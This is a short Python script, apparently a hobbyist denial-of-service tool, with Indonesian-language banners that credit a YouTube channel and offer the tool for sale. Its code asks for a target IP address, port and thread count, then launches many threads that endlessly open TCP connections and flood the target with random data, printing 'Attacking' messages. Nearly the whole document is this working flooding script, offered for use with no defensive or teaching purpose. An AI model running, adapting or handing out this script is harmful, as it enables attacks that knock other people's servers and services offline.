# Coding Time By Ibnu Samp
# Tools Usage By : Ibnu Samp
# Tools Credit By : Ibnu Samp
# Don't Leak Your Tools Now !!!

# Import Module
import random
import socket
import threading
import os
# Info Tools [ XC Tools ]
os.system("clear")

print("--------------------------------------")
print("[+] Tools Used By : Ibnu Saml")
print("[+] Credit Tools : YT Ibnu Saml ")
print("[+] Ini tools gue yang mau rename bilang aja sama gue :)")
print("[+] gw jual")
print("[+] Harga 10k:)")
print("[+] Ibnu Samp jangan lupa subscribe ")
print("---------------------------------------")

ip = str(input("[/] Enter IP nya mas : "))
port = int(input("[/] Enter Portnya mas (80/3389)   : "))
times = int(input("[/] Enter Packet buat orang : "))
threads = int(input("[/] Enter Thread (1000) : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[!] Attacking By Ibnu Samp Tools DDoS Auto Suspend IP => ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()